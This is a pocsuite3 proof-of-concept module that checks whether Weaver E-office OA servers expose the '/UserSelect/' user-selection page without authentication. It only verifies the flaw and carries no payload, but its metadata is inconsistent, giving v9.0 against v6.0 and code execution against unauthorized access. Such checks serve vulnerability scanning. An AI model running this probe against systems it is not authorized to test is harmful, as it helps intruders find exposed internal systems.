from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微OA E-office v9.0 未授权访问漏洞'
    appName = '泛微OA E-office v9.0 未授权访问漏洞'
    appVersion = '泛微OA E-office v6.0'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司 E-office 存在未授权访问'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Content-Type':'application/x-www-form-urlencoded'
        }
        path='/UserSelect/'
        vulur = self.url+path
        try:
            resp = requests.get(vulur,headers=headers,verify=False,allow_redirects=False,timeout=10)
            if resp.status_code == 200 and "选择人员" in resp.text and "/UserSelect/top.php" in resp.text and "/UserSelect/main.php" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulur
            return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
